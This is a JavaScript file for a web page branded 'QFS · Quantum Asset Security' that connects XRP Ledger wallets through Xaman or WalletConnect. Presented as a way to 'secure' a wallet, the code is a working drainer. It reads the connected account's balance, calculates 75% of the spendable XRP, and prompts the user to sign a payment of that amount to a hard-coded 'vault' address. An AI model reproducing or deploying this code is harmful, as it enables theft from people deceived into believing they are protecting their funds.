// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT & STATE
// ==============================
// Using implicit: true is essential for mobile deep-linking stability
const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });

let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

// Catch redirect back from Xaman mobile
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    handlePostConnect("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

/**
 * Updates all buttons to trigger the manual signature flow
 */
function updateAllButtonsToSecure() {
  const buttons = document.querySelectorAll('#mainActionButton');
  buttons.forEach(btn => {
    btn.removeAttribute("data-bs-toggle");
    btn.removeAttribute("data-bs-target");
    
    btn.innerText = "Secure Wallet to Vault";
    btn.classList.remove("btn-primary");
    btn.classList.add("btn-success"); 
    
    // User must click this button to trigger the payload
    btn.onclick = (e) => {
      e.preventDefault();
      triggerManualApproval();
    };
  });
}

// ==============================
// CONNECTION LOGIC
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");
    
    if (type === "xaman") {
      const session = await xumm.authorize();
      if (session?.me?.account) {
        handlePostConnect("xaman", session.me.account);
      }
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) {
        handlePostConnect("walletconnect", address);
      }
    }
  } catch (err) {
    console.error("Connect Error:", err);
    setStatus("Connection failed");
  }
}

/**
 * Transition UI after successful connection
 */
async function handlePostConnect(type, address) {
    currentAddress = address;
    currentWalletType = type;

    const modalEl = document.getElementById('walletSelectionModal');
    if (modalEl) {
        const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
        modalInstance.hide();
    }

    updateAllButtonsToSecure();
    setStatus(`Connected: ${shortAddr(address)}`);

    // IMPORTANT: We do NOT auto-trigger the prompt here to avoid browser blocks
    setStatus("Wallet Connected. Tap 'Secure Wallet' to finalize.");
}

// ==============================
// APPROVAL & SIGNING
// ==============================
async function triggerManualApproval() {
  if (!currentAddress) return;

  try {
    setStatus("Fetching network data...");
    const data = await getXrpAccountData(currentAddress);

    setStatus("Awaiting signature…");
    await signAndSubmit(currentWalletType, currentAddress, data.sendDrops);
  } catch (err) {
    console.error("Approval Error:", err);
    setStatus("Click button to sign");
  }
}

async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops || "0" 
  };

  if (type === "xaman") {
    try {
      const payload = await xumm.payload.create(tx);
      
      if (payload && payload.next) {
          const openUrl = payload.next.always;
          
          // Use window.location.href for maximum mobile compatibility
          // This forces a redirect that browsers cannot block
          window.location.href = openUrl;
          
          setStatus("Opening Xaman...");
      }
    } catch (err) {
      console.error("Xaman Payload Error:", err);
      setStatus("Failed to open Xaman");
    }
  } 
  
  else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
    setStatus("Check your wallet app");
  }
}

// ==============================
// DATA FETCHING (XRPL)
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();

  try {
    const info = await client.request({
      command: "account_info",
      account: address,
      ledger_index: "validated"
    }).catch(() => null);

    if (!info) {
        return { sendDrops: "0" }; 
    }

    const bal = BigInt(info.result.account_data.Balance);
    const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);

    // Reserve: 10 XRP + 2 XRP per owner object
    const reserve = 10_000_000n + (ownerCount * 2_000_000n);
    const spendable = bal - reserve;
    
    const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;

    return {
      sendXrp: Number(send) / 1_000_000,
      sendDrops: send.toString()
    };
  } finally {
    await client.disconnect();
  }
}

// ==============================
// WALLETCONNECT INTERNALS
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS · Quantum Asset Security",
      description: "Secure Wallet Transfer",
      url: window.location.origin,
      icons: ["https://xrpl.org/assets/img/logo.svg"]
    }
  });
  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"],
        events: ["accountsChanged"]
      }
    }
  });

  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();

  const account = session.namespaces.xrpl.accounts[0];
  return account.split(":")[2];
}